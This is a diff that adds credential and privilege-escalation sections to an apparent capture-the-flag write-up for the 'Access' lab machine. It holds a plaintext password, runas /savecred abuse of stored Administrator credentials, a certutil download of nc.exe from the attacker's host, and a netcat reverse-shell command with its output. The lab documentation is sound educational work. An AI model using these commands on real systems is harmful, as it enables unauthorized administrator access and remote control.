@@ -11,7 +11,6 @@ Date 7 May 2021
 - [Enumeration](#enumeration)
 - [User flag](#user-flag)
 - [Privesc](#privesc)
-- [Privesc2](#privesc2)
 
 # Enumeration
 
@@ -266,6 +265,11 @@ We look at mbox text and we found other interesting stuff:
 
 ## User flag
 
+```
+user: security
+pass: 4Cc3ssC0ntr0ller
+```
+
 We try with telnet access and we are able to retrive user flag:
 
 ```
@@ -305,6 +309,60 @@ ff1f3b48913b213a31ff6756d2553d38
 C:\Users\security\Desktop>
 
 ```
+
+## Privesc
+
+We look for saved credentials and we found:
+
+```
+C:\Users\security\Desktop>cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:interactive=ACCESS\Administrator
+                                                       Type: Domain Password
+    User: ACCESS\Administrator
+```
+
+At this point we can already grab Administrator flag with:
+
+```
+c:\windows\system32\runas.exe /user:ACCESS\Administrator /savecred "c:\windows\system32\cmd.exe /c TYPE c:\users\administrator\Desktop\root.txt > c:\users\security\root.txt"
+```
+
+In order to get a shell, we need `nc` on target machine:
+
+```
+# cp /usr/share/windows-resources/binaries/nc.exe www/
+# nc -nlvp 9002
+listening on [any] 9002 ...
+```
+
+On target, we use `certutil` to download file from our python webserver:
+
+```
+PS C:\users\security> certutil -urlcache -f http://10.10.14.21:8000/nc.exe c:\users\security\nc.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+```
+
+At this point, we spawn another listener on port 9002 and we obtain a reverse shell:
+
+```
+PS C:\users\security> runas /user:Access\Administrator /savecred "nc.exe -nv 10.10.14.21 9002 -e cmd.exe"
+
+
+connect to [10.10.14.21] from (UNKNOWN) [10.10.10.98] 49176
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+access\administrator
+```
+
+
+
 
 
 
